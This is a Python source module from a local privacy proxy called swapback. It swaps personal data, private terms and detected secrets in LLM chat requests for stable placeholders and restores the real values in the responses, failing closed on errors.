"""swapback.core: swap known personal values and PII patterns for stable placeholders before a chat request leaves
your machine, and put the real values back in the response.

Plain functions over OpenAI-style JSON; the HTTP proxy (swapback.proxy) is a thin adapter. No ML/NER: what is
swapped is what you list (known values, private terms) plus what the pattern detectors find. Never logs or prints a
real value: counts and types only.

Pieces
  Known values  a YAML/JSON file you write (known_file): {TYPE: [values]} or [[value, TYPE], ...]. Matched with
                pyahocorasick, case-insensitive, whole words; a multi-word value also matches with its words joined by
                any whitespace run (NBSP, tabs), zero-width characters, '.', '_', '-' or '%20', and every such
                variant shares the value's one placeholder. PHONE entries are expanded to their common formats.
  Private terms an optional YAML file (private_terms_file): `terms:` phrases or regexes -> «PRIVATE_TERM_n»,
                `figures:` money amounts expanded to every written format ($1.5B, 1,500M, USD 1.5 billion, ...)
                -> «PRIVATE_FIGURE_n».
  Patterns      phones via phonenumbers; email, Luhn card, IBAN, US SSN, IP, URL via Presidio's predefined recognizer
                patterns (vendored); API keys and tokens via the gitleaks default rules (vendored); a few local rules
                where no library exists (street address, keyword-anchored account number / date of birth, order no.).
  Vault         value -> «TYPE_n», one stable map in state_dir/vault.json (0600, local only).
  Restore       exact «TYPE_n», and bare TYPE_n when it is in the vault; streamed text (OpenAI chat chunks and Anthropic
                /v1/messages events) holds back a possibly split placeholder until the next chunk; tool-call arguments
                get JSON-escaped values. A per-request Forms record puts back each variant exactly as it was written.
  Fail closed   any error while scrubbing raises ScrubError (the proxy answers 503 and nothing is forwarded); after the
                swap the outgoing strings are re-checked for known values and the request is blocked if one is left.
  Paths         a known value that is one segment of a filesystem path (/home/<user>/..., ~/...) is left alone, so
                agents' file tools keep working; restore keeps the original case of every value.
CLI: swapback stats | health | canary | scrub-file IN.json | check-config   (swapback --help)
"""
import fnmatch, json, os, re, sys, threading, time, hashlib, tempfile

L, R = "\u00ab", "\u00bb"
TYPES = ("PRIVATE_FIGURE", "PRIVATE_TERM", "PERSON", "EMAIL", "PHONE", "ADDRESS", "SSN", "CARD", "IBAN", "ACCOUNT", "DOB",
         "ORDER", "IP", "HOST", "SECRET", "PROFILE", "ORG", "ID", "FAMILY")
PH_RE = re.compile(L + r"([A-Z]+(?:_[A-Z]+)*)_(\d+)" + R)
JS_PH_RE = re.compile(r"\\u00[aA][bB]([A-Z]+(?:_[A-Z]+)*)_(\d+)\\u00[bB][bB]")    # «» escaped inside JSON text
BARE_RE = re.compile(r"(?<![A-Za-z0-9_" + L + r"])(" + "|".join(TYPES) + r")_(\d+)(?![0-9A-Za-z_" + R + r"])")
CANARY = [("Zorblat Quenneville", "PERSON"), ("zorblat.canary@example.org", "EMAIL")]   # fake, used by `canary`
DEFAULTS = {"mode": "on", "listen": "127.0.0.1:8787", "upstream": "https://api.openai.com", "allow_remote": False,
            "known_file": "", "private_terms_file": "", "state_dir": "", "alert_webhook": "", "alert_min_interval_s": 3600,
            "log_requests": True, "restore_bare": True, "patterns": {}, "phone_regions": ["US"],
            "url_swap": ["linkedin.com/in/"], "extra_secret_rules": "", "cache_items": 4000, "canary_model": "",
            "upstream_timeout_s": 900,
            "system_note": "Note: values written like \u00abPERSON_3\u00bb or \u00abEMAIL_1\u00bb are privacy stand-ins that the "
                           "user's own device swaps back to the real value. Use them exactly as written, including in "
                           "tool arguments, and do not mention them."}
ENV = {"mode": "SWAPBACK_MODE", "listen": "SWAPBACK_LISTEN", "upstream": "SWAPBACK_UPSTREAM",
       "known_file": "SWAPBACK_KNOWN_FILE", "private_terms_file": "SWAPBACK_PRIVATE_TERMS",
       "state_dir": "SWAPBACK_STATE_DIR", "alert_webhook": "SWAPBACK_ALERT_WEBHOOK",
       "canary_model": "SWAPBACK_CANARY_MODEL"}
PATH_KEYS = ("known_file", "private_terms_file", "state_dir", "extra_secret_rules")


class ScrubError(Exception):
    pass


# ---------------------------------------------------------------- config
def _env(name):
    """SWAPBACK_X, else the pre-0.2 name PII_SCRUBBER_X (deprecated, read-only fallback)."""
    v = os.environ.get(name)
    if not v and name.startswith("SWAPBACK_"):
        v = os.environ.get("PII_SCRUBBER_" + name[len("SWAPBACK_"):])
    return v


def config_path():
    p = _env("SWAPBACK_CONFIG")
    if p:
        return p
    return "swapback.yaml" if os.path.exists("swapback.yaml") else ""


def load_cfg(path=None):
    """defaults <- YAML config file (SWAPBACK_CONFIG, or ./swapback.yaml) <- SWAPBACK_* env vars
    (the pre-0.2 PII_SCRUBBER_* names are still read when the new one is unset).
    Relative file paths in the config file are relative to that file."""
    import yaml
    c = dict(DEFAULTS)
    path = path if path is not None else config_path()
    base = os.getcwd()
    if path:
        with open(path, encoding="utf-8") as f:
            c.update(yaml.safe_load(f) or {})
        base = os.path.dirname(os.path.abspath(path))
    for k in PATH_KEYS:
        v = c.get(k)
        if v:
            c[k] = os.path.join(base, os.path.expanduser(str(v)))
    for k, env in ENV.items():
        v = _env(env)
        if v:
            c[k] = os.path.abspath(os.path.expanduser(v)) if k in PATH_KEYS else v
    m = c.get("mode")
    c["mode"] = "on" if m is True else "off" if m is False else str(m).strip().lower()   # YAML reads on/off as bools
    if c["mode"] not in ("off", "watch", "on"):
        raise ValueError("mode must be on, watch or off")
    ToolPolicy(c.get("tool_restore", True))             # a bad tool_restore section fails here, at load
    from . import hooks as _hooks
    _hooks.spec(c)                                      # a malformed hooks section fails here too (the module loads at start)
    c["_config_dir"] = base
    return c


def state_dir(cfg):
    d = cfg.get("state_dir") or os.path.join(os.environ.get("XDG_STATE_HOME") or os.path.expanduser("~/.local/state"),
                                             "swapback")
    os.makedirs(d, mode=0o700, exist_ok=True)
    return d


def _write_private(path, obj):
    d = os.path.dirname(path)
    fd, tmp = tempfile.mkstemp(dir=d, prefix=".tmp-")
    with os.fdopen(fd, "w", encoding="utf-8") as f:
        json.dump(obj, f, ensure_ascii=False)
    os.chmod(tmp, 0o600)
    os.replace(tmp, path)


# ---------------------------------------------------------------- patterns
def iban_ok(v):
    v = v.replace(" ", "").upper()
    if not 15 <= len(v) <= 34:
        return False
    r = v[4:] + v[:4]
    try:
        return int("".join(str(int(c, 36)) for c in r)) % 97 == 1
    except ValueError:
        return False


SUFFIX = (r"(?:St|Street|Ave|Avenue|Rd|Road|Blvd|Boulevard|Way|Ln|Lane|Dr|Drive|Ct|Court|Pl|Place|Ter|Terrace|Pkwy|"
          r"Parkway|Hwy|Highway|Cir|Circle|Loop|Trl|Trail)")
PATTERNS = [   # (TYPE, regex, group). Only types no maintained library covers; the rest are in scrub_detect.py
    ("HOST", re.compile(r"(?i)(?<![A-Za-z0-9\-.])[a-z0-9][a-z0-9\-]*(?:\.[a-z0-9\-]+)*\.ts\.net\b"), 0),
    ("ORDER", re.compile(r"(?<![\d-])\d{3}-\d{7}-\d{7}(?![\d-])"), 0),
    ("DOB", re.compile(r"(?i)\b(?:born|dob|d\.o\.b\.?|date of birth|birthday|birth date)\b[\s:,\-]*(?:on\s+|is\s+)?"
                       r"(\d{1,2}[/.\-]\d{1,2}[/.\-]\d{2,4}|[A-Z][a-z]{2,8}\.? \d{1,2},? \d{4}|\d{4}-\d{2}-\d{2})"), 1),
    ("ACCOUNT", re.compile(r"(?i)\b(?:account|acct|routing|a/c)\s*(?:no\.?|number|num|#|id)?\s*[:#]?\s*((?:\d[ -]?){6,16}\d)\b"), 1),
    ("ADDRESS", re.compile(r"\b\d{1,6}(?:-\d{1,4})?\s+(?:[NSEW]{1,2}\.?\s+)?(?:\d{1,3}(?:st|nd|rd|th)\s+|[A-Z][a-z]+\s+){1,3}"
                           + SUFFIX + r"\b\.?(?:\s+(?:NE|NW|SE|SW|[NSEW])\b)?(?:,?\s+(?:Apt|Unit|Suite|Ste|#)\.?\s*[A-Za-z0-9\-]+)?"), 0),
    # gitleaks targets source code and misses tokens inside URL query strings (?..._token=<uuid>&...)
    ("SECRET", re.compile(r"(?i)[?&][\w.-]*(?:token|key|secret|sig|auth|code|passw)[\w.-]*="
                          r"((?=[^&#\s\"']*\d)(?=[^&#\s\"']*[A-Za-z])[A-Za-z0-9_\-.%~+/]{16,})"), 1),
    # 0.1.1, generic: an email written with a bracketed at/dot ("ann [at] example [dot] org", "ann(at)example.org")
    ("EMAIL", re.compile(r"(?i)(?<![\w.+\-])[A-Za-z0-9._%+\-]+\s*[\[({<]\s*at\s*[\])}>]\s*[A-Za-z0-9\-]+"
                         r"(?:(?:\s*[\[({<]\s*dot\s*[\])}>]\s*|\.)[A-Za-z0-9\-]+)*"
                         r"(?:\s*[\[({<]\s*dot\s*[\])}>]\s*|\.)[A-Za-z]{2,}(?![\w\-])"), 0),
    # 0.1.1, generic: an email with a full-width/small @ or zero-width characters hidden in it
    ("EMAIL", re.compile(r"(?<![\w.+\-])[\w.+\-\u200b\u200c\u200d\u2060]+[\u200b\u200c\u200d\u2060]*[@\uff20\ufe6b]"
                         r"[\u200b\u200c\u200d\u2060]*[\w\-]+(?:[.\uff0e][\w\-\u200b\u200c\u200d\u2060]+)+"), 0),
    # 0.1.1, generic: IPv6 (full or compressed), checked by the ipaddress module in _valid
    ("IP", re.compile(r"(?<![\w:.])(?:[0-9A-Fa-f]{0,4}:){2,7}[0-9A-Fa-f]{0,4}(?![\w:])"), 0),
]
# cheap substring gates: a pattern runs only when one of its literals is in the lowercased text
GATES = {0: (".ts.net",), 2: ("born", "dob", "d.o.b", "birth"), 3: ("acc", "routing", "a/c"), 5: ("token", "key", "secret",
         "sig", "auth", "code", "passw"), 6: ("at]", "at)", "at}", "at>", "at ]", "at )", "at }", "at >"),
         7: ("\uff20", "\ufe6b", "\u200b", "\u200c", "\u200d", "\u2060"), 8: ("::", ":0", ":1", ":2", ":3", ":4", ":5", ":6",
         ":7", ":8", ":9", ":a", ":b", ":c", ":d", ":e", ":f")}
SKIP_IP = re.compile(r"^(?:127\.|0\.0\.0\.0|255\.|1\.1\.1\.1$|8\.8\.[48]\.[48]$)")


def _valid(t, v):        # local policy on top of the library checks
    if t == "IP":
        if ":" in v and "." not in v:                 # IPv6: a real address, 3+ groups, not loopback/unspecified
            import ipaddress
            try:
                a = ipaddress.IPv6Address(v.split("%")[0])
            except ValueError:
                return False
            return not (a.is_loopback or a.is_unspecified) and sum(1 for g in v.split(":") if g) >= 3
        if SKIP_IP.match(v) or ":" in v and v.startswith("::"):
            return False
        p = v.split("/")[0].split(".")
        return not (len(p) == 4 and int(p[0]) < 10 and all(int(x) < 50 for x in p[1:]))   # 1.2.3.4-style versions
    return True


_DET = {}
DEFAULT_EXTRA_RULES = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vendor", "extra_rules.toml")


def detectors(extra=None):
    """library detectors, built once per process per extra-rules file (gitleaks compile ~50 ms)."""
    extra = extra or DEFAULT_EXTRA_RULES
    if extra not in _DET:
        from . import detect as d
        _DET[extra] = (d, d.Presidio(iban_ok=iban_ok), d.Gitleaks(extra=extra))
    return _DET[extra]


# ---------------------------------------------------------------- known values
def _norm_key(v):
    return re.sub(r"\s+", " ", v.strip().lower())


# Between the words of a known multi-word value: any run of Unicode whitespace (NBSP, tabs, several spaces), zero-width
# characters, '.', '_', '-' or a URL-encoded space. "Jane Doe", "Jane\u00a0Doe", "Jane.Doe", "JANE_DOE" and "Jane%20Doe"
# are the same value: one placeholder, and the egress re-check uses the same rule.
SEP_RX = r"(?:[\s\u200b\u200c\u200d\u2060\ufeff._\-]|%20)+"
_SEP_RE = re.compile(SEP_RX)


def _canon(v):
    """the key a value is stored under when its written variants share one placeholder."""
    return _SEP_RE.sub(" ", v.strip().lower()).strip()


def _variant_rx(key):
    """regex for a known multi-word value in any separator/case variant, with the matcher's whole-word edges."""
    words = key.split(" ")
    return re.compile(r"(?<![\w@.])" + SEP_RX.join(re.escape(w) for w in words) + r"(?![\w@])", re.I)


class Forms:
    """per-request record of the surface form behind each placeholder, in order of occurrence. Variants of one value
    share a placeholder; restore with the same Forms puts back the form that was written (occurrence by occurrence,
    then the last one seen), so a round trip stays byte-exact."""

    def __init__(self):
        self.seen, self.next = {}, {}

    def add(self, ph, v):
        self.seen.setdefault(ph, []).append(v)

    def take(self, ph):
        lst = self.seen.get(ph)
        if not lst:
            return None
        i = self.next.get(ph, 0)
        self.next[ph] = i + 1
        return lst[i] if i < len(lst) else lst[-1]


def _phone_variants(p):
    d = re.sub(r"\D", "", p)
    if len(d) == 11 and d.startswith("1"):
        d = d[1:]
    if len(d) != 10:
        return [p] if len(d) >= 7 else []
    a, b, c = d[:3], d[3:6], d[6:]
    return [d, "1" + d, "+1" + d, f"{a}-{b}-{c}", f"({a}) {b}-{c}", f"{a}.{b}.{c}", f"+1 {a} {b} {c}", f"+1 ({a}) {b}-{c}",
            f"+1-{a}-{b}-{c}", f"{a} {b} {c}", f"+1 {a}-{b}-{c}"]


def load_known(path):
    """[(value, TYPE)] from a YAML or JSON file: {TYPE: [values]}, [[value, TYPE], ...] or {"known": [...]}.
    PHONE values are expanded to their common written formats. Raises ScrubError on a malformed file."""
    import yaml
    try:
        with open(path, encoding="utf-8") as f:
            d = yaml.safe_load(f) or {}
    except Exception as e:
        raise ScrubError("known_file unreadable: %s" % type(e).__name__) from None
    if isinstance(d, dict) and "known" in d:
        d = d["known"]
    pairs = []
    if isinstance(d, dict):
        for t, vals in d.items():
            for v in vals or []:
                pairs.append((v, t))
    elif isinstance(d, list):
        for x in d:
            if isinstance(x, dict):
                pairs.append((x.get("value"), x.get("type", "PERSON")))
            else:
                pairs.append(tuple(x))
    else:
        raise ScrubError("known_file must be a mapping or a list")
    out, seen = [], set()
    for v, t in pairs:
        t = str(t or "PERSON").upper()
        if t not in TYPES:
            raise ScrubError("known_file: unknown type %s" % t)
        v = str(v or "").strip()
        if len(v) < 2:
            continue
        for x in (_phone_variants(v) if t == "PHONE" else [v]):
            k = (_norm_key(x), t)
            if k not in seen:
                seen.add(k)
                out.append((x, t))
    return out


# ---------------------------------------------------------------- custom private terms
# Things that are not PII but must never reach a provider (a codename, an internal figure). Generic: the values live
# only in your private_terms_file; figures are dollar amounts expanded here to every written format.
_CUR = r"(?:US\$|USD\s?|\$)\s?"
_UNITS = ((1e9, r"(?:billion|bn|bil|b)"), (1e6, r"(?:million|mm|mn|mil|m)"))


def _num_re(x, opt_zero=True):
    s = ("%.6f" % x).rstrip("0").rstrip(".")
    ip, _, dp = s.partition(".")
    g = []
    while len(ip) > 3:
        g.insert(0, ip[-3:])
        ip = ip[:-3]
    g.insert(0, ip)
    ipr = ",?".join(g)
    if ipr == "0" and dp:
        ipr = "0?"
    if dp:
        return ipr + r"\." + dp + "0*"
    return ipr + (r"(?:\.0+)?" if opt_zero else r"(?:\.00)?")


def figure_regex(amount, need_currency=False):
    """$1.5B, 1.5 billion, $1,500M, USD 1500 million, $1,500,000,000 ... for one dollar amount. Never a bare digit run,
    never a longer or different number (no digit, dot or comma may touch either end)."""
    a = float(amount)
    forms = []
    for unit, suf in _UNITS:
        n = a / unit
        if n >= 0.1 and abs(round(n, 3) - n) < 1e-9 * max(1.0, n):
            forms.append(_num_re(round(n, 3)) + r"[\s-]?(?i:" + suf + r")(?![A-Za-z0-9&])")   # not M&A
    alts = []
    if forms:
        alts.append((_CUR if need_currency else "(?:" + _CUR + ")?") + "(?:" + "|".join(forms) + ")")
    alts.append(_CUR + _num_re(a, opt_zero=False) + r"(?![\d.,]?\d)")
    return r"(?<![\w.,])(?:" + "|".join(alts) + ")"


def figure_gates(amount):
    """literal strings, one of which every figure_regex(amount) match contains once commas are dropped (a cheap skip)."""
    a, out = float(amount), []
    for unit, _suf in _UNITS:
        n = a / unit
        if n >= 0.1 and abs(round(n, 3) - n) < 1e-9 * max(1.0, n):
            s = ("%.6f" % round(n, 3)).rstrip("0").rstrip(".")
            out.append(s[1:] if s.startswith("0.") else s)
    out.append(("%.2f" % a).rstrip("0").rstrip("."))
    return sorted(set(out))


def build_private_terms(path):
    """-> ([[TYPE, regex, gates], ...], {"by_type": {...}, "bad": n}) from a private terms file:
        terms:   ["Project Bluebird", {"regex": "blue ?bird v\\d"}]   -> PRIVATE_TERM (case-insensitive, whole words)
        figures: [2500000, {"amount": 42e6, "need_currency": true}]     -> PRIVATE_FIGURE (all written formats)
    A bad entry is counted, not fatal. Counts only; never prints a value."""
    import yaml
    try:
        with open(path, encoding="utf-8") as f:
            d = yaml.safe_load(f) or {}
    except Exception as e:
        raise ScrubError("private_terms_file unreadable: %s" % type(e).__name__) from None
    rules, by, bad = [], {}, 0
    for x in d.get("terms") or []:
        try:
            if isinstance(x, dict) and "regex" in x:
                body = str(x["regex"])
            else:
                body = SEP_RX.join(re.escape(w) for w in str(x.get("value") if isinstance(x, dict) else x).split())
            rx = r"(?i:(?<![\w-])(?:" + body + r")(?![\w-]))"
            re.compile(rx)
        except Exception:  # noqa: BLE001
            bad += 1
            continue
        rules.append(["PRIVATE_TERM", rx, None])
        by["PRIVATE_TERM"] = by.get("PRIVATE_TERM", 0) + 1
    for x in d.get("figures") or []:
        try:
            x = x if isinstance(x, dict) else {"amount": x}
            rx = figure_regex(x["amount"], bool(x.get("need_currency")))
            re.compile(rx)
        except Exception:  # noqa: BLE001
            bad += 1
            continue
        rules.append(["PRIVATE_FIGURE", rx, figure_gates(x["amount"])])
        by["PRIVATE_FIGURE"] = by.get("PRIVATE_FIGURE", 0) + 1
    return rules, {"by_type": by, "bad": bad}


# ---------------------------------------------------------------- filesystem paths
# A known name that is one segment of a filesystem path (/home/<user>/x, ~/x, a/b/<name>/c) is a folder name, not a
# person: swapping it breaks agent tool calls (read_file on a path whose case changed). URLs and domains still swap.
_PATH_STOP = frozenset(" \t\r\n\"'`<>()[]{},;|=*")
_DOMAIN_HEAD = re.compile(r"^[A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)*\.[A-Za-z]{2,}(?::\d+)?/")


def in_fs_path(text, s, e):
    """True when text[s:e] is a whole segment of a POSIX-looking path token."""
    seg = text[s:e]
    if not seg or any(c in _PATH_STOP or c == "/" for c in seg):
        return False
    before = text[s - 1] if s else ""
    after = text[e] if e < len(text) else ""
    if before != "/" and after != "/":
        return False
    a, b, n = s, e, len(text)
    while a > 0 and text[a - 1] not in _PATH_STOP:
        a -= 1
    while b < n and text[b] not in _PATH_STOP:
        b += 1
    tok = text[a:b]
    if "://" in tok or "@" in tok or tok.lower().startswith("www."):
        return False                                   # a URL or an address, not a file
    if tok.startswith(("/", "~", "./", "../", "\\/")):
        return True                                    # absolute, home-relative or explicit relative path
    if _DOMAIN_HEAD.match(tok):
        return False                                   # example.com/<name>
    return tok.count("/") >= 2                         # a/b/c relative path; "Jane/Ozzie" stays a name pair


class Scrubber:
    def __init__(self, cfg=None, known=None, vault_path=None, private=None):
        """known: [(value, TYPE)] to use instead of cfg known_file; private: rules from build_private_terms() to use
        instead of cfg private_terms_file. The fake canary values are always part of the known list."""
        self.cfg = cfg or load_cfg()
        self.lock = threading.RLock()
        self.sdir = state_dir(self.cfg)
        self.vault_path = vault_path or os.path.join(self.sdir, "vault.json")
        self.known_path = self.cfg.get("known_file") or ""
        self.private_path = self.cfg.get("private_terms_file") or ""
        self.known_mtime = None
        self.cache = {}
        self.verified = set()
        self.private = []
        self._known_fixed, self._private_fixed = known is not None, private is not None
        self._load_vault()
        if known is not None:
            self._set_known(list(known) + CANARY)
        if private is not None:
            self._set_private(private)
        self.reload_known(force=True)
        self.on = self.cfg.get("patterns") or {}
        self.patterns = [(t, p, g, GATES.get(i)) for i, (t, p, g) in enumerate(PATTERNS) if self.on.get(t, True)]
        self.det, self.presidio, self.gitleaks = detectors(self.cfg.get("extra_secret_rules"))
        self.presidio.url_keep = tuple(self.cfg.get("url_swap") or ("linkedin.com/in/",))
        self.regions = tuple(self.cfg.get("phone_regions") or ("US", "IN"))

    # vault ---------------------------------------------------------
    def _load_vault(self):
        try:
            v = json.load(open(self.vault_path, encoding="utf-8"))
        except (OSError, ValueError):
            v = {}
        self.fwd = v.get("fwd") or {}            # norm key -> placeholder
        self.rev = v.get("rev") or {}            # placeholder -> value
        self.ctr = v.get("ctr") or {}
        self.dirty = False

    def save_vault(self):
        with self.lock:
            if self.dirty:
                _write_private(self.vault_path, {"fwd": self.fwd, "rev": self.rev, "ctr": self.ctr})
                self.dirty = False

    def placeholder(self, value, t, key=None, canon=None):
        """value -> stable «TYPE_n». key: a known value or private term (its canonical key); every written variant of it
        shares one placeholder, the vault keeps `canon` (the known-file spelling) and a Forms object keeps the surface
        forms for exact restore. Without key (pattern hits) each written form keeps its own stand-in."""
        if key is not None:
            k = t + "|" + key
        else:
            k = t + "|" + _norm_key(value) if t not in ("PHONE",) else "PHONE|" + re.sub(r"\D", "", value)[-10:]
        with self.lock:
            ph = self.fwd.get(k)
            if ph is not None and key is None and self.rev.get(ph) != value:  # phones too: each written form keeps its own
                k += "\x00" + value               # a case/spacing variant gets its own stand-in: restore is exact
                ph = self.fwd.get(k)
            if ph is None:
                n = int(self.ctr.get(t, 0)) + 1
                self.ctr[t] = n
                ph = f"{L}{t}_{n}{R}"
                self.fwd[k] = ph
                self.rev[ph] = canon if canon is not None else value
                self.dirty = True
            return ph

    # known ---------------------------------------------------------
    def _set_known(self, known):
        self.known = {}
        for v, t in known:
            self.known[_norm_key(v)] = (v, t)
        self.known_m = detectors()[0].KnownMatcher(list(self.known))
        self.known_var = [(k, _variant_rx(k), k.split(" ")[0], k.split(" ")[-1]) for k in self.known if " " in k]
        self.cache = {}
        self.verified = set()

    def _set_private(self, rules):
        by, gates = {}, {}           # one alternation per type: one pass over the text each, not one per entry
        for r in rules or []:
            t, rx, g = (list(r) + [None])[:3]
            by.setdefault(t, []).append("(?:%s)" % rx)
            gates[t] = None if (not g or (t in gates and gates[t] is None)) else gates.get(t, []) + list(g)
        # gates: skip a type's regex when none of its literals is in the text (commas dropped); None = always run
        self.private = [(t, re.compile("|".join(v)), tuple(gates[t]) if gates[t] else None) for t, v in by.items()]
        self.cache = {}
        self.verified = set()

    def _private_hits(self, text, low=None):
        if not self.private:
            return
        low2 = (low if low is not None else text.lower()).replace(",", "")    # gates only test containment
        for t, rx, g in self.private:
            if g and not any(x in low2 for x in g):
                continue
            for m in rx.finditer(text):
                if m.end() > m.start():
                    yield m.start(), m.end(), t, m.group(0)

    def _mtimes(self):
        out = []
        for p in (self.known_path, self.private_path):
            if not p:
                out.append(None)
                continue
            try:
                out.append(os.stat(p).st_mtime)
            except OSError:
                raise ScrubError("configured file is missing: %s" % os.path.basename(p)) from None
        return tuple(out)

    def reload_known(self, force=False):
        """re-read known_file / private_terms_file when they change. A configured file that is missing or unreadable
        raises ScrubError, so the proxy fails closed instead of sending text it was told to protect."""
        if self._known_fixed and self._private_fixed:
            return
        mt = self._mtimes()
        if not force and mt == self.known_mtime:
            return
        with self.lock:
            if not self._known_fixed:
                self._set_known((load_known(self.known_path) if self.known_path else []) + CANARY)
            if not self._private_fixed:
                self._set_private(build_private_terms(self.private_path)[0] if self.private_path else [])
            self.known_mtime = mt

    # spans ---------------------------------------------------------
    def spans(self, text):
        """[(start, end, TYPE, value)] for everything that would be swapped (public, unchanged shape)."""
        return [x[:4] for x in self.spans_keyed(text)]

    def spans_keyed(self, text):
        """spans() plus each hit's placeholder key: (known/private-term key, canonical spelling), or None."""
        sp = []
        low = self.det.lower_same_len(text)
        for s, e, k in self._known_hits(text, low):
            v, t = self.known.get(k, (text[s:e], "PERSON"))
            sp.append((s, e, t, 0, text[s:e], (k, v)))   # one placeholder per known value; the surface form rides Forms
        for s, e, t, v in self._private_hits(text, low):
            sp.append((s, e, t, 0, v, (_canon(v), None)))
        found = self.presidio.find(text, low) + self.gitleaks.find(text, low)
        if any(c.isdigit() for c in text):
            found += self.det.find_phones(text, self.regions)
        for s, e, t, v in found:
            if self.on.get(t, True) and e > s and _valid(t, v):
                sp.append((s, e, t, 1, v, None))
        for t, p, g, gate in self.patterns:
            if gate and not any(x in low for x in gate):
                continue
            for m in p.finditer(text):
                s, e = m.span(g)
                v = text[s:e]
                if e <= s or not _valid(t, v):
                    continue
                sp.append((s, e, t, 1, v, None))
        sp.sort(key=lambda x: (x[0], x[3], -(x[1] - x[0])))
        res, last = [], -1
        for s, e, t, pr, v, key in sp:
            if s >= last:
                res.append((s, e, t, v, key))
                last = e
            elif res and e > res[-1][1] and s == res[-1][0]:
                res[-1] = (s, e, t, v, key)
                last = e
        return res

    def scrub_text(self, text, counts=None, forms=None):
        """forms: a Forms object that records the surface form behind each placeholder (for exact restore)."""
        if not text or len(text) < 3:
            return text
        h = hashlib.blake2b(text.encode("utf-8", "surrogatepass"), digest_size=16).digest()
        c = self.cache.get(h)
        if c is not None:
            if counts is not None:
                for t, n in c[1].items():
                    counts[t] = counts.get(t, 0) + n
            if forms is not None:
                for ph, v in c[2]:
                    forms.add(ph, v)
            return c[0]
        out, pos, local, phs = [], 0, {}, []
        for s, e, t, v, key in self.spans_keyed(text):
            out.append(text[pos:s])
            sv = text[s:e]
            ph = self.placeholder(sv, t, *(key or ()))   # pattern hits: the vault keeps the surface form (fix2)
            out.append(ph)
            phs.append((ph, sv))
            if forms is not None:
                forms.add(ph, sv)
            local[t] = local.get(t, 0) + 1
            pos = e
        out.append(text[pos:])
        r = "".join(out)
        if len(self.cache) > int(self.cfg.get("cache_items", 4000)):
            self.cache.clear()
            self.verified.clear()
        self.cache[h] = (r, local, tuple(phs))
        if counts is not None:
            for t, n in local.items():
                counts[t] = counts.get(t, 0) + n
        return r

    def leftover_known(self, text):
        """egress check: known values still present (count only)."""
        if not text:
            return 0
        return len(self._known_hits(text)) + sum(1 for _x in self._private_hits(text))

    def _known_hits(self, text, low=None):
        """known-value hits, minus those that are a segment of a filesystem path (/home/<user>/..., ~/...)."""
        hits = self.known_m.find(text, low)
        if self.known_var:
            low = low if low is not None else self.det.lower_same_len(text)
            more = [(m.start(), m.end(), k) for k, rx, w0, w1 in self.known_var if w0 in low and w1 in low
                    for m in rx.finditer(text)]
            if more:
                hits = sorted(hits + more, key=lambda h: (h[0], h[0] - h[1]))
                out, last = [], -1
                for h in hits:
                    if h[0] >= last:
                        out.append(h)
                        last = h[1]
                hits = out
        if hits and "/" in text:
            hits = [h for h in hits if not in_fs_path(text, h[0], h[1])]
        return hits

    def path_kept(self, text):
        """how many known-value hits in text were left alone because they sit inside a filesystem path."""
        if not text or "/" not in text:
            return 0
        return sum(1 for s, e, _k in self.known_m.find(text) if in_fs_path(text, s, e))

    # request -------------------------------------------------------
    SKIP_KEYS = {"model", "role", "type", "tool_call_id", "id", "tool_choice", "response_format", "stop", "format",
                 "reasoning_effort", "service_tier"}

    def scrub_request(self, body, counts=None, forms=None, api=None):
        """mutates and returns body; raises ScrubError on anything unexpected (fail closed). forms: see Forms.
        api: "chat" (default), "anthropic" (/v1/messages) or "responses" (/v1/responses); says where the
        system note goes."""
        counts = {} if counts is None else counts
        left = [0]

        def walk(o, key=None, parent=None):
            if isinstance(o, dict):
                is_fn = "parameters" in o or "arguments" in o
                for k in list(o):
                    v = o[k]
                    if k in self.SKIP_KEYS or (k == "name" and is_fn):
                        if isinstance(v, str):
                            left[0] += self.leftover_known(v)
                        continue
                    if k == "url" and isinstance(v, str) and v.startswith("data:"):
                        continue
                    o[k] = walk(v, k, o)
                return o
            if isinstance(o, list):
                return [walk(x, key, parent) for x in o]
            if isinstance(o, str):
                s = self.scrub_text(o, counts, forms)
                h = hashlib.blake2b(s.encode("utf-8", "surrogatepass"), digest_size=16).digest()
                if h not in self.verified:
                    n = self.leftover_known(s)
                    left[0] += n
                    if not n:
                        self.verified.add(h)
                return s
            return o
        try:
            self.reload_known()
            if isinstance(body, dict):                # /v1/embeddings input, /v1/completions prompt as token ids: unreadable
                for k in ("input", "prompt"):
                    v = body.get(k)
                    if isinstance(v, int) or (isinstance(v, list) and any(
                            isinstance(x, int) or (isinstance(x, list) and any(isinstance(y, int) for y in x)) for x in v)):
                        raise ScrubError("token-id %s cannot be checked" % k)
            walk(body)
            note = self.cfg.get("system_note")
            if note and isinstance(body, dict):
                add_system_note(body, note, api, swapped=any(v for v in counts.values() if isinstance(v, int)))
        except ScrubError:
            raise
        except Exception as e:
            raise ScrubError("scrub failed: %s" % type(e).__name__) from None
        if left[0]:
            raise ScrubError("egress check: %d known value(s) left after the swap" % left[0])
        self.save_vault()
        return body

    # restore -------------------------------------------------------
    def _val(self, ph, js, forms=None):
        v = forms.take(ph) if forms is not None else None
        if v is None:
            v = self.rev.get(ph)
        if v is None:
            return None
        return json.dumps(v, ensure_ascii=False)[1:-1] if js else v

    def restore_text(self, text, js=False, stats=None, forms=None):
        """placeholders -> values. With the request's Forms, each variant comes back exactly as it was written;
        without, the vault's spelling (for a known value, as written in the known file)."""
        if not text or ("_" not in text):
            return text

        def rep(m):
            v = self._val(m.group(0), js, forms)
            if v is None:
                if stats is not None:
                    stats["unknown"] = stats.get("unknown", 0) + 1
                return m.group(0)
            if stats is not None:
                stats["restored"] = stats.get("restored", 0) + 1
            return v
        text = PH_RE.sub(rep, text)
        if js and "\\u00" in text:
            def rep_js(m):
                v = self._val(f"{L}{m.group(1)}_{m.group(2)}{R}", True, forms)
                if v is None:
                    return m.group(0)
                if stats is not None:
                    stats["restored"] = stats.get("restored", 0) + 1
                return v
            text = JS_PH_RE.sub(rep_js, text)
        if self.cfg.get("restore_bare", True):
            def rep2(m):
                ph = f"{L}{m.group(1)}_{m.group(2)}{R}"
                v = self._val(ph, js, forms)
                if v is None:
                    return m.group(0)
                if stats is not None:
                    stats["restored"] = stats.get("restored", 0) + 1
                return v
            text = BARE_RE.sub(rep2, text)
        return text

    def tool_policy(self):
        tr = self.cfg.get("tool_restore", True)
        k = json.dumps(tr, sort_keys=True, default=str)
        if getattr(self, "_tp_key", None) != k:
            self._tp, self._tp_key = ToolPolicy(tr), k
        return self._tp

